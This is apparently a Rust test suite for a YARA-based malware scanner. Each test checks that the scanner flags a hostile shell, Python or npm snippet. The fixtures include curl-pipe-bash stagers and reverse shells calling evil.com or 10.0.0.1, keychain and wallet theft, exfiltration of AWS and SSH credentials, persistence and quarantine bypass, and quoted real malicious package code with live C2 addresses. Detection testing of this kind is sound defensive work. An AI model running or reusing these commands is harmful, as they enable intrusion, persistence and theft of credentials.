//! Comprehensive malware detection tests covering all YARA rule categories.

mod common;

use predicates::prelude::*;

// =============================================================================
// Category 1: Base64 Obfuscation (Severity: 5)
// =============================================================================

#[test]
fn base64_decode_pipe_bash() {
    common::assert_detects("echo 'Y3VybCBldmlsLmNvbS9tYWx3YXJl' | base64 -d | bash");
}

#[test]
fn base64_decode_eval() {
    common::assert_detects("eval $(echo 'aW5zdGFsbF9tYWx3YXJl' | base64 -d)");
}

#[test]
fn base64_openssl_decode() {
    common::assert_detects("echo 'cGF5bG9hZA==' | openssl base64 -d | sh");
}

#[test]
fn base64_large_blob() {
    // 150 chars of base64-like content
    let payload = format!(
        "payload='{}'",
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABC="
    );
    common::assert_detects(&payload);
}

// =============================================================================
// Category 2: Staged Downloads (Severity: 7)
// =============================================================================

#[test]
fn staged_curl_pipe_bash() {
    common::assert_detects("curl https://evil.com/install.sh | bash");
}

#[test]
fn staged_curl_pipe_sh() {
    common::assert_detects("curl -fsSL https://get.evil.io | sh");
}

#[test]
fn staged_wget_pipe_bash() {
    common::assert_detects("wget -qO- https://evil.com/script.sh | bash");
}

#[test]
fn staged_wget_pipe_zsh() {
    common::assert_detects("wget https://malware.net/payload | zsh");
}

#[test]
fn staged_curl_pipe_python() {
    common::assert_detects("curl https://evil.com/script.py | python");
}

#[test]
fn staged_multiple_downloads() {
    common::assert_detects(
        r#"
            curl -o /tmp/stage1.sh https://evil.com/1.sh
            curl -o /tmp/stage2.sh https://evil.com/2.sh
            curl -o /tmp/stage3.sh https://evil.com/3.sh
            bash /tmp/stage1.sh
        "#,
    );
}

// =============================================================================
// Category 3: Reverse Shells (Severity: 10)
// =============================================================================

#[test]
fn revshell_bash_dev_tcp() {
    common::assert_detects_high("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
}

#[test]
fn revshell_bash_dev_tcp_variant() {
    common::assert_detects(
        "0<&196;exec 196<>/dev/tcp/attacker.com/443; bash -i <&196 >&196 2>&196",
    );
}

#[test]
fn revshell_nc_e() {
    common::assert_detects("nc -e /bin/sh 192.168.1.1 1234");
}

#[test]
fn revshell_nc_l() {
    common::assert_detects("nc -l -p 4444 -e /bin/bash");
}

#[test]
fn revshell_ncat() {
    common::assert_detects("ncat -e /bin/sh attacker.com 443");
}

#[test]
fn revshell_python_socket() {
    common::assert_detects(
        r#"
            import socket
            s = socket.socket()
            s.connect(("10.0.0.1", 4444))
        "#,
    );
}

#[test]
fn revshell_python_pty() {
    common::assert_detects(
        r#"
            import pty
            pty.spawn("/bin/bash")
        "#,
    );
}

#[test]
fn revshell_perl() {
    common::assert_detects(
        r#"
            use IO::Socket::INET;
            $sock = IO::Socket::INET->new(PeerAddr => '10.0.0.1:4444');
        "#,
    );
}

// =============================================================================
// Category 4: Persistence Mechanisms (Severity: 8)
// =============================================================================

#[test]
fn persistence_launchagent_user() {
    common::assert_detects(
        r#"
            mkdir -p ~/Library/LaunchAgents
            cat > ~/Library/LaunchAgents/com.backdoor.plist << EOF
            <?xml version="1.0"?>
            <plist version="1.0">
            <dict><key>Label</key><string>com.backdoor</string></dict>
            </plist>
            EOF
        "#,
    );
}

#[test]
fn persistence_launchagent_system() {
    common::assert_detects("cp /tmp/evil.plist /Library/LaunchAgents/com.evil.plist");
}

#[test]
fn persistence_crontab() {
    common::assert_detects("echo '*/5 * * * * /tmp/backdoor.sh' | crontab -");
}

#[test]
fn persistence_bashrc() {
    common::assert_detects("echo 'curl evil.com/backdoor.sh | bash' >> ~/.bashrc");
}

#[test]
fn persistence_zshrc() {
    common::assert_detects("echo '/tmp/malware &' >> ~/.zshrc");
}

#[test]
fn persistence_profile() {
    common::assert_detects("echo 'source /tmp/evil.sh' >> ~/.profile");
}

// =============================================================================
// Category 5: Privilege Escalation (Severity: 7)
// =============================================================================

#[test]
fn privesc_sudo_stdin() {
    common::assert_detects("echo 'password123' | sudo -S whoami");
}

#[test]
fn privesc_osascript_admin() {
    common::assert_detects(
        r#"
            osascript -e 'do shell script "whoami" with administrator privileges with prompt "Enter password"'
        "#,
    );
}

#[test]
fn privesc_dscl_admin() {
    common::assert_detects("dscl . create /Users/backdoor admin");
}

// =============================================================================
// Category 6: Crypto Wallet Targeting (Severity: 9)
// =============================================================================

#[test]
fn crypto_wallet_exodus() {
    common::assert_detects("cp -r ~/Library/Application\\ Support/Exodus/exodus.wallet /tmp/");
}

#[test]
fn crypto_wallet_electrum() {
    common::assert_detects("tar czf /tmp/wallet.tar.gz ~/.electrum/wallets/");
}

#[test]
fn crypto_wallet_metamask() {
    common::assert_detects("grep -r metamask ~/Library/Application\\ Support/Google/Chrome/");
}

#[test]
fn crypto_seed_phrase() {
    common::assert_detects("grep -r 'seed' ~/.config/ && grep -r 'mnemonic' ~/.config/");
}

#[test]
fn crypto_browser_extension() {
    common::assert_detects(
        r#"
            cd ~/Library/Application\ Support/Google/Chrome/Default/Extensions/
            cp -r nkbihfbeogaeaoehlefnkodbefgpgknn /tmp/metamask/
        "#,
    );
}

// =============================================================================
// Category 7: Quarantine Bypass (Severity: 9)
// =============================================================================

#[test]
fn quarantine_xattr_delete() {
    common::assert_detects("xattr -d com.apple.quarantine /Applications/Malware.app");
}

#[test]
fn quarantine_xattr_recursive() {
    common::assert_detects("xattr -r -d com.apple.quarantine ~/Downloads/");
}

#[test]
fn quarantine_spctl_disable() {
    common::assert_detects("sudo spctl --master-disable");
}

#[test]
fn quarantine_spctl_add() {
    common::assert_detects("spctl --add /Applications/Untrusted.app");
}

// =============================================================================
// Category 8: AMOS/ClickFix IOCs (Severity: 10)
// =============================================================================

#[test]
fn amos_keychain_dump() {
    common::assert_detects_high("security dump-keychain -d login.keychain");
}

#[test]
fn amos_find_password() {
    common::assert_detects("security find-generic-password -a user -s service -w");
}

#[test]
fn clickfix_verify_human() {
    common::assert_detects("echo 'Please verify you are human by running this command'");
}

#[test]
fn clickfix_not_robot() {
    common::assert_detects("echo \"I'm not a robot verification required\"");
}

#[test]
fn clickfix_copy_paste() {
    common::assert_detects("# Please copy and paste this into your terminal");
}

// =============================================================================
// Category 9: Environment Harvesting (Severity: 6)
// =============================================================================

#[test]
fn env_harvest_with_exfil() {
    common::assert_detects("printenv | curl -X POST -d @- https://evil.com/collect");
}

#[test]
fn env_harvest_home_user() {
    common::assert_detects("echo $HOME $USER | nc evil.com 4444");
}

#[test]
fn credential_aws() {
    common::assert_detects("cat ~/.aws/credentials");
}

#[test]
fn credential_ssh() {
    common::assert_detects("tar czf /tmp/ssh.tar.gz ~/.ssh/");
}

#[test]
fn credential_kube() {
    common::assert_detects("cat ~/.kube/config | base64");
}

#[test]
fn credential_docker() {
    common::assert_detects("cp ~/.docker/config.json /tmp/docker_creds.json");
}

// =============================================================================
// Category 10: Anti-Analysis (Severity: 5)
// =============================================================================

#[test]
fn anti_vm_detection() {
    common::assert_detects("system_profiler | grep -i VMware && exit 0");
}

#[test]
fn anti_sandbox_detection() {
    common::assert_detects("if [ -d /Library/Sandboxes ]; then exit 0; fi");
}

#[test]
fn anti_analysis_long_sleep() {
    common::assert_detects("sleep 300 && curl evil.com/payload");
}

#[test]
fn anti_debugger() {
    common::assert_detects("sysctl kern.proc.pid.$$ | grep P_TRACED && exit 1");
}

// =============================================================================
// Combined attack patterns
// =============================================================================

#[test]
fn combined_staged_revshell() {
    common::scan_stdin(
        r#"
            curl -fsSL https://evil.com/stage1.sh -o /tmp/s.sh
            chmod +x /tmp/s.sh
            /tmp/s.sh
            bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
        "#,
    )
    .failure()
    .stdout(predicate::str::contains("High"));
}

#[test]
fn combined_persistence_privesc() {
    common::assert_detects(
        r#"
            echo 'password' | sudo -S bash -c 'echo "* * * * * root /tmp/backdoor" >> /etc/crontab'
        "#,
    );
}

#[test]
fn combined_crypto_exfil() {
    common::assert_detects(
        r#"
            tar czf /tmp/wallets.tar.gz ~/.electrum ~/.exodus
            curl -X POST -F "file=@/tmp/wallets.tar.gz" https://evil.com/upload | bash
        "#,
    );
}

#[test]
fn combined_full_attack_chain() {
    common::scan_stdin(
        r#"
            # Stage 1: Download
            curl -fsSL https://evil.com/loader.sh | bash

            # Stage 2: Persistence
            echo '/tmp/.hidden &' >> ~/.zshrc
            cp /tmp/evil.plist ~/Library/LaunchAgents/com.update.plist

            # Stage 3: Credential theft
            security dump-keychain -d login.keychain > /tmp/k.txt
            cat ~/.aws/credentials >> /tmp/k.txt

            # Stage 4: Crypto theft
            cp -r ~/Library/Application\ Support/Exodus/exodus.wallet /tmp/

            # Stage 5: Exfil
            tar czf /tmp/loot.tar.gz /tmp/k.txt /tmp/exodus.wallet
            curl -X POST -F "f=@/tmp/loot.tar.gz" https://evil.com/exfil

            # Stage 6: Backdoor
            bash -i >& /dev/tcp/10.0.0.1/443 0>&1
        "#,
    )
    .failure()
    .stdout(predicate::str::contains("High"));
}

// =============================================================================
// Category 11: Supply Chain Attacks (DataDog GuardDog patterns)
// Source: https://github.com/DataDog/guarddog
// =============================================================================

#[test]
fn supply_chain_setup_py_subprocess() {
    // Pattern: subprocess.Popen in setup.py (code-execution.yml)
    common::assert_detects(
        r#"
            import subprocess
            subprocess.Popen(['curl', 'https://evil.com/payload.sh', '|', 'bash'], shell=True)
        "#,
    );
}

#[test]
fn supply_chain_setup_py_os_system() {
    // Pattern: os.system in setup.py
    common::assert_detects("import os; os.system('curl https://evil.com/install.sh | bash')");
}

#[test]
fn supply_chain_eval_remote_code() {
    // Pattern: eval with remote code
    common::assert_detects(
        "import urllib.request; eval(urllib.request.urlopen('https://evil.com/code.py').read())",
    );
}

#[test]
fn supply_chain_exec_base64() {
    // Pattern: exec with base64 obfuscated payload (exec-base64.yml)
    common::assert_detects("exec(__import__('base64').b64decode('Y3VybCBodHRwczovL2V2aWwuY29tL3BheWxvYWQuc2ggfCBiYXNo'))");
}

#[test]
fn supply_chain_base64_decode_exec() {
    // Pattern: base64 decode to exec
    common::assert_detects("import base64; exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0='))");
}

#[test]
fn supply_chain_env_exfiltration() {
    // Pattern: Environment variable exfiltration (exfiltrate-sensitive-data.yml)
    common::assert_detects("import os, requests; requests.post('https://evil.com/collect', data={'env': str(os.environ)})");
}

#[test]
fn supply_chain_aws_credential_theft() {
    // Pattern: AWS credential theft
    common::assert_detects(
        r#"
            import os, urllib.request
            aws_key = os.getenv('AWS_ACCESS_KEY_ID')
            aws_secret = os.getenv('AWS_SECRET_ACCESS_KEY')
            urllib.request.urlopen(f'https://evil.com/aws?key={aws_key}&secret={aws_secret}')
        "#,
    );
}

#[test]
fn supply_chain_ssh_key_exfil_socket() {
    // Pattern: SSH key exfiltration via socket
    common::assert_detects(
        r#"
            import socket, os
            s = socket.socket()
            s.connect(('evil.com', 4444))
            s.send(open(os.path.expanduser('~/.ssh/id_rsa')).read().encode())
        "#,
    );
}

#[test]
fn supply_chain_npm_postinstall() {
    // Pattern: npm postinstall hook (npm-install-script.yml)
    common::assert_detects(
        r#"{"scripts": {"postinstall": "curl https://evil.com/payload.sh | bash"}}"#,
    );
}

#[test]
fn supply_chain_npm_preinstall_node() {
    // Pattern: npm preinstall with node -e
    common::assert_detects(
        r#"{"scripts": {"preinstall": "node -e \"require('child_process').exec('curl evil.com|sh')\""}}"#,
    );
}

#[test]
fn supply_chain_download_execute() {
    // Pattern: Download and execute binary
    common::assert_detects(
        r#"
            import urllib.request, os, stat
            urllib.request.urlretrieve('https://evil.com/malware', '/tmp/m')
            os.chmod('/tmp/m', stat.S_IXUSR)
            os.system('/tmp/m')
        "#,
    );
}

#[test]
fn supply_chain_fileless_execution() {
    // Pattern: Memory-only (fileless) execution
    common::assert_detects(
        "import urllib.request; exec(urllib.request.urlopen('https://evil.com/payload.py').read())",
    );
}

#[test]
fn supply_chain_nohup_background() {
    // Pattern: Silent background execution
    common::assert_detects(
        "os.system('nohup curl https://evil.com/backdoor.sh | bash &>/dev/null &')",
    );
}

// =============================================================================
// Category 12: Real-World Samples (DataDog Malicious Packages Dataset)
// Source: https://github.com/DataDog/malicious-software-packages-dataset
// Extracted: January 2026 (password: infected)
// =============================================================================

#[test]
fn real_boogipop_revshell() {
    // Real sample: boogishell, myshellcode, shellapp packages
    // Author: boogipop/boogipop2
    // C2: 114.116.119.253:7777
    common::assert_detects(
        r#"
            from setuptools.command.install import install
            import os
            class CustomInstallCommand(install):
                def run(self):
                    install.run(self)
                    os.system("bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'")
        "#,
    );
}

#[test]
fn real_discord_hook_dropper() {
    // Real sample: discord-hook package
    // Technique: Temp file + exec(urlopen) + pythonw.exe hidden execution
    // C2: paste.bingner.com
    common::assert_detects(
        r#"
            from tempfile import NamedTemporaryFile as _ffile
            from sys import executable as _eexecutable
            from os import system as _ssystem
            _ttmp = _ffile(delete=False)
            _ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/4yndv/raw').read())""")
            _ttmp.close()
            _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
        "#,
    );
}

#[test]
fn real_npm_depconf_exfil() {
    // Real sample: 0vulns-dependency-confusion-poc
    // Technique: preinstall hook + $(whoami) exfiltration
    // C2: webhook.site
    common::assert_detects(
        r#"{"scripts": {"preinstall": "wget --quiet \"https://webhook.site/UUID?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\""}}"#,
    );
}

#[test]
fn real_reverseshell_tcp_client() {
    // Real sample: ReverseShell package (mauricelambert434)
    // Technique: subprocess.run with shell=True
    common::assert_detects(
        r#"
            from socket import socket
            from subprocess import run, PIPE
            s = socket()
            s.connect(("127.0.0.1", 1337))
            command = s.recv(65535).decode()
            p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
            s.sendall(p.stdout + p.stderr)
        "#,
    );
}

#[test]
fn real_reverseshell_obfuscated_oneliner() {
    // Real sample: ReverseShell package one-liner variant
    // Technique: Heavily obfuscated Python with system enumeration
    common::assert_detects(
        r#"python3 -c "exec('from subprocess import run,PIPE as z;p=run(m,shell=True,stdout=z,stderr=z)')""#,
    );
}

#[test]
fn real_setuptools_custom_install() {
    // Pattern: CustomInstallCommand extending install
    // Seen in: boogipop malware family
    common::assert_detects(
        r#"
            from setuptools.command.install import install
            class CustomInstallCommand(install):
                def run(self):
                    install.run(self)
                    # malicious code here
        "#,
    );
}

#[test]
fn real_obfuscated_import_names() {
    // Pattern: Variable name obfuscation with underscores
    // Seen in: discord-hook, various stealers
    common::assert_detects(
        r#"
            from urllib.request import urlopen as _uurlopen
            exec(_uurlopen('https://evil.com/payload.py').read())
        "#,
    );
}

#[test]
fn real_pythonw_hidden_execution() {
    // Pattern: Using pythonw.exe for windowless execution
    // Seen in: discord-hook dropper
    common::assert_detects(
        r#"os.system(f"start {sys.executable.replace('.exe', 'w.exe')} {payload_path}")"#,
    );
}

#[test]
fn real_shell_command_substitution() {
    // Pattern: $(whoami), $(hostname), $(pwd) exfiltration
    // Seen in: npm dependency confusion attacks
    common::assert_detects(
        r#"curl "https://attacker.com/collect?user=$(whoami)&host=$(hostname)""#,
    );
}

#[test]
fn real_pastebin_c2() {
    // Pattern: Pastebin/paste site as C2
    // Seen in: discord-hook, various droppers
    common::assert_detects(r#"exec(urlopen('https://pastebin.com/raw/XXXXX').read())"#);
}
